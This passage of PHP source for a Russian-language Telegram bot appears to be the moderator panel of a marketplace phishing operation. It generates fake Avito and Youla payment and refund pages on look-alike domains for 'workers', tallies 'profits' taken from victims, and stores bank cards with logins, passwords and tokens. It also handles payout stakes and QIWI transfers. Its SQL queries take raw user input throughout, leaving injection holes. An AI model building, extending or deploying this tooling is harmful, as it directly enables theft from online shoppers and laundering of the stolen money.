							$query = mysqli_query($connection, "SELECT `type`, `advert_id`, `worker`, `title`, `price`, `views` FROM `adverts` WHERE `status` = '1' ORDER BY `id` DESC LIMIT 10");
						} elseif(preg_match('/\/adverts \d+/', $message['text']) == TRUE) {
							$worker['telegram'] = mb_substr($message['text'], 9);
						} elseif(preg_match('/\/adverts @{0,1}[\w.]+/i', $message['text']) == TRUE) {
							$search = str_replace('@', '', mb_substr($message['text'], 9));
							$worker = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `telegram` FROM `accounts` WHERE `username` LIKE '%$search%'"));
						}

						if($message['text'] == '/adverts') {
							$text = "🗂 <b>10 последних объявлений:</b>\n\n";

							while($row = mysqli_fetch_assoc($query)) {
								$x = $x+1;
								if(mb_strlen($row['title']) > 18) $row['title'] = mb_substr($row['title'], 0, 18) .'[...]';
								if($row['type'] == 0) $type = 'Авито' AND $url = 'https://'.$domains['avito'].'/buy?id='.$row['advert_id']; if($row['type'] == 1) $type = 'Юла' AND $url = 'https://'.$domains['youla'].'/product/'.$row['advert_id'].'/buy/delivery';
								$text .= "<b>".$x.".</b> <a href=\"https://avito.ru/$row[advert_id]\">$row[title]</a> — <b>Сумма:</b> <code>$row[price] руб.</code> | <a href=\"tg://user?id=$row[worker]\">Воркер</a>\n<i>$type</i> <b>| Оплата:</b> <a href=\"$url\">$row[advert_id]</a> | <b>Переходов:</b> <code>$row[views]</code>\n";
							}
							send($config['token'], 'sendMessage', Array('chat_id' => $message['chat_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} else {
							send($config['token'], 'sendMessage', Array('chat_id' => $message['chat_id'], 'text' => getMyAdverts($worker['telegram'], 1), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => getMyAdverts($worker['telegram'], 1, 1)));
						}
					}
				}
			}

			// ===================== [ ЧАТ МОДЕРАТОРОВ ] ===================== //

			if($message['chat_id'] == $config['chat']['moders']) {
				$isAccess = mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `telegram` = '$message[from]' AND `access` >= '666'");

				if(mysqli_num_rows($isAccess) > 0) {
					if($message['text'] == '/help') {
						$text = "⚙️ <b>Основные команды</b>\n";
						$text .= "/help — Показать список команд\n";
						$text .= "/stats — Показать статистику проекта\n";
						$text .= "/info <code>[Telegram ID] или [username]</code> — Показать информацию о воркере\n";
						$text .= "/setdelivery <code>[Сумма]</code> — Установить сумму за доставку по умолчанию\n";
						$text .= "/warn <code>[Telegram ID]</code> — выдать предупреждение воркеру\n";
						$text .= "/unwarn <code>[Telegram ID]</code> — снять предупреждение воркеру\n";
						$text .= "/ban <code>[Telegram ID]</code> — заблокировать воркера\n";
						$text .= "/unban <code>[Telegram ID]</code> — разаблокировать воркера\n";
						$text .= "/checkip <code>[IP адрес]</code> — информация об IP адресе\n";
						$text .= "/stake <code>[Оплата];[Возврат]</code> — изменить ставку по умолчанию\n";
						$text .= "/setstake <code>[Telegram ID];[Оплата];[Возврат]</code> — изменить ставку воркеру\n";
						$text .= "/setbalance <code>[Telegram ID];[Сумма]</code> — изменить баланс воркеру\n";
						$text .= "/minprice <code>[Сумма]</code> — изменить минимальную сумму объявления\n";
						$text .= "/maxprice <code>[Сумма]</code> — изменить максимальную сумму объявления\n";
						$text .= "/msg <code>[Telegram ID];[Текст сообщения]</code> — отправить сообщение\n";
						$text .= "/say <code>[Текст сообщения]</code> — рассылка всем активным пользователям бота\n";
						$text .= "\n🗂 <b>Работа с объявлениями</b>\n";
						$text .= "/advert <code>[ID объявления]</code> — Подробная информация об объявлении\n";
						$text .= "/adverts <code>[Telegram ID] или ничего</code> — 10 последних объявлений или объявления пользователя\n";
						$text .= "/create <code>[Telegram ID];[ID объявления];[Название];[Цена]</code> — сгенерировать объявление\n";
						$text .= "/settitle <code>[ID объявления];[Название товара]</code> — Изменить название объявления\n";
						$text .= "/setimage <code>[ID объявления];[URL изображения]</code> — Изменить изображение объявления\n";
						$text .= "/setprice <code>[ID объявления];[Сумма]</code> — Изменить сумму объявления\n";
						$text .= "/deladvert <code>[ID объявления]</code> — скрыть объявление\n";
						$text .= "/resadvert <code>[ID объявления]</code> — восстановить объявление\n";
						$text .= "\n💳 <b>Работа с картами</b>\n";
						$text .= "/cards — Показать информацию о картах\n";
						$text .= "/setcard <code>[Telegram ID];[Карта]</code> — Установить карту воркеру\n";
						$text .= "/addcard <code>[Логин]:[Пароль]:[Токен]:[Номер карты]</code> — Добавить карту\n";
						$text .= "/delcard <code>[Номер карты]</code> — Удалить карту из списка\n";
						$text .= "/changecard <code>[Текущая карта];[Новая карта]</code> — Перекинуть всех воркеров с одной карты на другую\n";
						$text .= "/qiwipay <code>[Номер QIWI];[Получатель];[Сумма];[Комментарий]</code> — Перевести деньги на QIWI кошелёк\n";
						$text .= "/defaultcard <code>[Номер карты]</code> — Сделать картой по умолчанию\n";

						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}

					if(preg_match('/\/referral_prog\//', $callback['type']) == TRUE) {
				        send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => referralInfo($callback['from']), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
			        }



//====================== МОДЕРКА - информация об объявлениях ==========================//



					if(preg_match('/^\/advert/i', $message['text']) == TRUE AND preg_match('/\/adverts/i', $message['text']) == FALSE) {
						if(preg_match('/^\/advert ([a-z0-9]{24}|\d+)$/i', $message['text']) == TRUE) {
							$advert_id = mb_substr($message['text'], 8);

							$query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$advert_id'");

							if(mysqli_num_rows($query) > 0) {
								$advert = mysqli_fetch_assoc($query);

								if($advert['type'] == 0) $url = "https://avito.ru/$advert[advert_id]" AND $platform = 'Авито';
								if($advert['type'] == 1) $url = "https://youla.ru/p$advert[advert_id]" AND $platform = 'Юла';

								if($advert['delivery'] == 0) $advert['delivery'] = $settings['delivery'];
								if($advert['status'] == -1) $status = 'Скрыто';
								if($advert['status'] == 0) $status = 'В обработке';
								if($advert['status'] == 1) $status = 'Активно';

								$payments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `advert_id` = '$advert_id' AND `status` = '1'"));

								$text = "💼 <b>Информация об объявлении</b> <a href=\"$url\">$advert_id</a>\n\n";
								$text .= "<b>Платформа:</b> <code>$platform</code>\n";
								$text .= "<b>Название товара:</b> <code>$advert[title]</code>\n";
								$text .= "<b>Сумма товара:</b> <code>$advert[price] руб.</code>\n";
								$text .= "<b>Сумма доставки:</b> <code>$advert[delivery] руб.</code>\n";
								$text .= "<b>Автор объявления:</b> <a href=\"tg://user?id=$advert[worker]\">$advert[worker]</a>\n";
								$text .= "<b>Просмотров объявления:</b> <code>".Endings($advert['views'], "просмотр", "просмотра", "просмоторв")."</code>\n";
								$text .= "<b>Статус:</b> <code>$status</code>\n";
								$text .= "<b>Успешных профитов:</b> <code>$payments[count]</code>\n";
								$text .= "<b>Общая сумма профита:</b> <code>".number_format($payments['total'])." руб.</code>\n";
								$text .= "<b>Дата генерации:</b> <code>".date("d.m.Y в H:i:s", $advert['time'])."</code>\n";

								if($advert['type'] == 0) {
									$keyboard = Array('inline_keyboard' => Array(Array(Array('text' => 'Страница оплаты', 'url' => 'https://'.$domains['avito'].'/buy?id='.$advert['advert_id']), Array('text' => 'Страница возврата', 'url' => 'https://'.$domains['avito'].'/refund?id='.$advert['advert_id']))));
								} elseif($advert['type'] == 1) {
									$keyboard = Array('inline_keyboard' => Array(Array(Array('text' => 'Страница оплаты', 'url' => 'https://'.$domains['youla'].'/product/'.$advert_id.'/buy/delivery'), Array('text' => 'Страница возврата', 'url' => 'https://'.$domains['youla'].'/refund/'.$advert_id))));
								} else {
									$keyboard = Array('inline_keyboard' => Array(Array()));
								}

								if($advert['status'] == -1) {
									array_push($keyboard['inline_keyboard'], Array(Array('text' => 'Восстановить объявление', 'callback_data' => '/show/'.$advert_id.'/')));
								} elseif($advert['status'] > 0) {
									array_push($keyboard['inline_keyboard'], Array(Array('text' => 'Скрыть объявление', 'callback_data' => '/hide/'.$advert_id.'/')));
								}

								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
							} else {
								$text = "🔎 <b>Объявление с таким ID не было найдено</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = "❔ Используйте /advert <code>[ID объявления]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}



//====================== МОДЕРКА - чат совсеми воркерами ==========================//



					if(preg_match('/\/say/i', $message['text']) == TRUE) {
							$say = $message['text'];
							$say = str_replace("/say","", $say);

							if(empty($say) || $say == ""){
								send($config['token'], 'sendMessage', Array('chat_id' => $message["from"], 'text' => '❔ Используйте <code>/say [Текст сообщения]</code>', 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = "<a href=\"tg://user?id=$message[from]\">$message[firstname]</a> запустил рассылку с текстом: $say";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								$users = mysqli_query($connection, "SELECT `telegram` FROM `accounts`");
								foreach ($users as $user) {
                        			send($config['token'], 'sendMessage', Array('chat_id' => $user["telegram"], 'text' => $say, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    			}
                    			send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => '👍 Рассылка была завершена.', 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    		}

					}



//====================== МОДЕРКА - ?????? ==========================//



					if(preg_match('/\/resadvert/i', $message['text']) == TRUE) {
						if(preg_match('/\/resadvert (.{24}|\d+)/i', $message['text']) == TRUE) {
							$advert_id = mb_substr($message['text'], 11);

							$query = mysqli_query($connection, "SELECT `type`, `worker`, `title`, `price`, `delivery` FROM `adverts` WHERE `advert_id` = '$advert_id' AND `status` = '-1'");

							if(mysqli_num_rows($query) > 0) {
								$advert = mysqli_fetch_assoc($query);
								mysqli_query($connection, "UPDATE `adverts` SET `status` = '1', `time` = '".time()."' WHERE `advert_id` = '$advert_id'");

								if($advert['delivery'] == '0') $advert['delivery'] = $settings['delivery'];

								$text = "📮 <b>Модератор восстановил ваше объявление</b> <code>$advert_id</code>\n\n";
								$text .= "<b>Название товара:</b> <code>$advert[title]</code>\n";
								$text .= "<b>Сумма товара:</b> <code>$advert[price] руб.</code>\n";
								$text .= "<b>Сумма доставки:</b> <code>$advert[delivery] руб.</code>\n\n";
								if($advert['type'] == 0) {
									$text .= "<b>Ссылка на оплату:</b> https://$domains[avito]/buy?id=$advert_id\n";
									$text .= "<b>Ссылка на возврат:</b> https://$domains[avito]/refund?id=$advert_id\n";
								} elseif($advert['type'] == 1) {
									$text .= "<b>Ссылка на оплату:</b> https://$domains[youla]/product/$advert_id/buy/delivery\n";
									$text .= "<b>Ссылка на возврат:</b> https://$domains[youla]/refund/$advert_id/\n";
								}
								send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								$text = "📮 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>восстановил объявление</b> <a href=\"tg://user?id=$advert[worker]\">воркера</a> <code>$advert_id</code>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = "🥴 <b>Объявление не существует или оно не скрыто</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = "❔ Используйте /resadvert <code>[ID объявления]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}



//====================== МОДЕРКА - удалить объявление ==========================//


					if(preg_match('/\/deladvert/i', $message['text']) == TRUE) {
						if(preg_match('/\/deladvert (.{24}|\d+)/i', $message['text']) == TRUE) {
							$advert_id = mb_substr($message['text'], 11);

							$query = mysqli_query($connection, "SELECT `worker` FROM `adverts` WHERE `advert_id` = '$advert_id' AND `status` >= '0'");

							if(mysqli_num_rows($query) > 0) {
								$advert = mysqli_fetch_assoc($query);
								mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `advert_id` = '$advert_id'");

								$text = "🚮 <b>Модератор скрыл ваше объявление</b> <code>$advert_id</code>\n\n";
								$text .= "Вы сможете восстановить его, отправив боту ссылку https://avito.ru/$advert_id";
								$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '♻️ Восстановить', 'callback_data' => '/show/'.$advert_id.'/')))));
								send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
								$text = "🚮 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>скрыл объявление</b> <a href=\"tg://user?id=$advert[worker]\">воркера</a> <code>$advert_id</code>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = "🥴 <b>Объявление не существует или уже неактивно</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = "❔ Используйте /deladvert <code>[ID объявления]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}



//====================== МОДЕРКА - добавить фото к объявлению или удалить ==========================//



					if(preg_match('/\/setimage/i', $message['text']) == TRUE) {
						if(preg_match('/\/setimage (.{24}|\d+);.+/i', $message['text']) == TRUE) {
							$edit = explode(';', mb_substr($message['text'], 10));

							if(preg_match('/(http|https):\/\/cache\d.youla.io\/files\/images\/.+.jpg/i', $edit[1]) == TRUE OR preg_match('/(http|https):\/\/\d{1,3}.img.avito.st\/\d{3,4}x\d{3,4}\/\d+.jpg/i', $edit[1]) == TRUE OR preg_match('/(http|https):\/\/i.imgur.com\/.+.jpg/i', $edit[1]) == TRUE) {
								$query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$edit[0]' AND `status` = '1'");

								if(mysqli_num_rows($query) > 0) {
									$advert = mysqli_fetch_assoc($query);

									mysqli_query($connection, "UPDATE `adverts` SET `image` = '$edit[1]' WHERE `advert_id` = '$edit[0]'");
									$text = "💶 <b>Модератор изменил вам изображение на объявлении</b> <code>$edit[0]</code> <b>на</b> $edit[1]";
									send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									$text = "💶 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил изображение на объявлении</b> <a href=\"tg://user?id=$advert[worker]\">воркера</a> <code>$edit[0]</code> <b>на</b> $edit[1]";
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									$text = "📬 <b>Объявление с таким ID не было найдено или уже неактивно</b>";
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							} else {
								$text = "🏞 <b>Ссылка на изображение указана некорректна</b>\n\n";
								$text .= "Скопируйте первое изображение из своего объявления на Авито или воспользуйтесь ботом для загрузки изображений @imgurplusbot";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = "❔ Используйте /setimage <code>[ID объявления];[URL изображения]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}


//====================== МОДЕРКА - добавить заголовок к объявлению или изменить ==========================//



					if(preg_match('/\/settitle/i', $message['text']) == TRUE) {
						if(preg_match('/\/settitle (.{24}|\d+);.+/i', $message['text']) == TRUE) {
							$edit = explode(';', mb_substr($message['text'], 10));

							if(mb_strlen($edit[1]) < 101) {
								$query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$edit[0]' AND `status` = '1'");

								if(mysqli_num_rows($query) > 0) {
									$advert = mysqli_fetch_assoc($query);

									mysqli_query($connection, "UPDATE `adverts` SET `title` = '$edit[1]' WHERE `advert_id` = '$edit[0]'");
									$text = "💶 <b>Модератор изменил вам название объявления</b> <code>$edit[0]</code> <b>с</b> <code>$advert[title]</code> <b>до</b> <code>$edit[1]</code>\n\n";

									if($advert['type'] == 0) {
										$text .= "<b>Оплата:</b> https://$domains[avito]/buy?id=$edit[0]\n";
										$text .= "<b>Возврат:</b> https://$domains[avito]/refund?id=$edit[0]";
									} elseif($advert['type'] == 1) {
										$text .= "<b>Оплата:</b> https://$domains[youla]/product/$edit[0]/buy/delivery\n";
										$text .= "<b>Возврат:</b> https://$domains[youla]/refund/$edit[0]/\n";
									}

									send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									$text = "💶 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил название объявления</b> <a href=\"tg://user?id=$advert[worker]\">воркера</a> <code>$edit[0]</code> <b>с</b> <code>$advert[title]</code> <b>на</b> <code>$edit[1]</code>";
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									$text = "📬 <b>Объявление с таким ID не было найдено или уже неактивно</b>";
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							} else {
								$text = "️🚫 <b>Название объявления не может быть длиннее 100 символов</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = "❔ Используйте /settitle <code>[ID объявления];[Название товара]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}



//====================== МОДЕРКА - добавить цену на объявление или изменить ==========================//



					if(preg_match('/\/setprice/i', $message['text']) == TRUE) {
						if(preg_match('/\/setprice (.{24}|\d+);\d{3,5}/i', $message['text']) == TRUE) {
							$edit = explode(';', mb_substr($message['text'], 10));

							if($edit[1] >= $settings['min_price'] AND $edit[1] <= $settings['max_price']) {
								$query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$edit[0]' AND `status` = '1'");

								if(mysqli_num_rows($query) > 0) {
									$advert = mysqli_fetch_assoc($query);

									mysqli_query($connection, "UPDATE `adverts` SET `price` = '$edit[1]' WHERE `advert_id` = '$edit[0]'");

									$text = "💶 <b>Модератор изменил вам цену для объявления</b> <code>$edit[0]</code> <b>с</b> <code>$advert[price] руб.</code> <b>до</b> <code>$edit[1] руб.</code>\n\n";
									if($advert['type'] == 0) {
										$text .= "<b>Оплата:</b> https://$domains[avito]/buy?id=$edit[0]\n";
										$text .= "<b>Возврат:</b> https://$domains[avito]/refund?id=$edit[0]";
									} elseif($advert['type'] == 1) {
										$text .= "<b>Оплата:</b> https://$domains[youla]/product/$edit[0]/buy/delivery\n";
										$text .= "<b>Возврат:</b> https://$domains[youla]/refund/$edit[0]/\n";
									}

									send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									$text = "💶 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил сумму объявления</b> <a href=\"tg://user?id=$advert[worker]\">воркера</a> <code>$edit[0]</code> <b>с</b> <code>$advert[price] руб.</code> <b>на</b> <code>$edit[1] руб.</code>";
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									$text = "📬 <b>Объявление с таким ID не было найдено или уже неактивно</b>";
								}
							} else {
								$text = "🚫 <b>Сумма товара не может быть больше $settings[max_price] руб. и меньше $settings[min_price] руб.</b>";
							}

							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} else {
							$text = "❔ Используйте /setprice <code>[ID объявления];[Сумма товара]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}




//====================== МОДЕРКА - добавить карту ==========================//




					if(preg_match('/\/addcard/i', $message['text']) == TRUE) {
						if(preg_match('/\/addcard (\d+|[0-9a-z@.]+|0):(.+|0):(.{32}|0):\d{16}/i', $message['text']) == TRUE) {
							$card = explode(':', mb_substr($message['text'], 9));

							$search = mysqli_query($connection, "SELECT `id` FROM `cards` WHERE `number` = '$card[3]'");
							if(mysqli_num_rows($search) <= 0) {
								mysqli_query($connection, "INSERT INTO `cards` (`login`, `password`, `amount`, `totalAmount`, `token`, `number`, `exp`, `cvv`, `status`, `blocked`, `verify`, `lastCheck`, `added`) VALUES ('$card[0]', '$card[1]', '0', '0', '$card[2]', '$card[3]', '0', '0', '1', '0', '0', '0', '".time()."')");
								$text = "💳 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>добавил карту</b> <code>$card[3]</code>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = "🚧 <b>Данная карта уже добавлена</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = "❔ Используйте /addcard <code>[Логин]:[Пароль]:[Токен]:[Номер карты]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}



//====================== МОДЕРКА - удалить карту ==========================//




					if(preg_match('/\/delcard/i', $message['text']) == TRUE) {
						if(preg_match('/\/delcard \d+/i', $message['text']) == TRUE) {
							$card = mb_substr($message['text'], 9);

							$query = mysqli_query($connection, "SELECT * FROM `cards` WHERE `number` ='$card'");

							if(mysqli_num_rows($query) > 0) {
								if($settings['card'] == $card) {
									mysqli_query($connection, "UPDATE `config` SET `card` = '0' WHERE `card` = '$card'");
								}

								mysqli_query($connection, "DELETE FROM `cards` WHERE `number` = '$card'");
								mysqli_query($connection, "UPDATE `accounts` SET `card` = '0' WHERE `card` = '$card'");
								$text = "🏦 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>удалил карту</b> <code>$card</code>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = "🏦 <b>Карта была не найдена</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = "❔ Используйте /delcard <code>[Номер карта]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}



//====================== МОДЕРКА - поменять карту ==========================//



					if(preg_match('/\/changecard/i', $message['text']) == TRUE) {
						if(preg_match('/\/changecard \d+;\d+/i', $message['text']) == TRUE) {
							$card = explode(';', mb_substr($message['text'], 12));

							$query = mysqli_query($connection, "SELECT * FROM `cards` WHERE `number` ='$card[0]'");
							$query1 = mysqli_query($connection, "SELECT * FROM `cards` WHERE `number` ='$card[1]'");

							if(mysqli_num_rows($query) > 0 AND mysqli_num_rows($query1) > 0) {
								mysqli_query($connection, "UPDATE `accounts` SET `card` = '$card[1]' WHERE `card` = '$card[0]'");
								$text = "🏦 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>сменил карту с</b> <code>$card[0]</code> <b>на</b> <code>$card[1]</code>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = "🏦 <b>Не найдена карта #1 или #2</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = "❔ Используйте /changecard <code>[Номер карта 1];[Номер карта 2]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}



//====================== МОДЕРКА - установить сумму за доставку ==========================//




					if(preg_match('/\/setdelivery/i', $message['text']) == TRUE) {
						if(preg_match('/\/setdelivery \d{1,4}/i', $message['text']) == TRUE) {
							$amount = substr($message['text'], 13);

							mysqli_query($connection, "UPDATE `config` SET `delivery` = '$amount'");

							$text = "🔑 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>установил сумму за доставку в </b> <code>$amount RUB</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							$text = "🔑 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>установил сумму за доставку в </b> <code>$amount RUB</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} else {
							$text = "❔ Используйте /setdelivery <code>[Сумма]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}



//====================== МОДЕРКА - снять предупреждение ==========================//



					if(preg_match('/\/unwarn/i', $message['text']) == TRUE) {
						if(preg_match('/\/unwarn \d+/i', $message['text']) == TRUE) {
							$user_id = mb_substr($message['text'], 8);

							$query = mysqli_query($connection, "SELECT `warns` FROM `accounts` WHERE `telegram` = '$user_id'");

							if(mysqli_num_rows($query) > 0) {
								$user = mysqli_fetch_assoc($query);

								if($user['warns'] > 0) {
									mysqli_query($connection, "UPDATE `accounts` SET `warns` = `warns`-1 WHERE `telegram` = '$user_id'");
									$text = "⚠️ <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>снял предупреждение с</b> <a href=\"tg://user?id=$user_id\">воркера</a> <code>[".($user['warns']-1)."/3]</code>";
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									$text = "⚠️ <b>Модератор снял вам предупреждение</b> <code>[".($user['warns']-1)."/3]</code>";
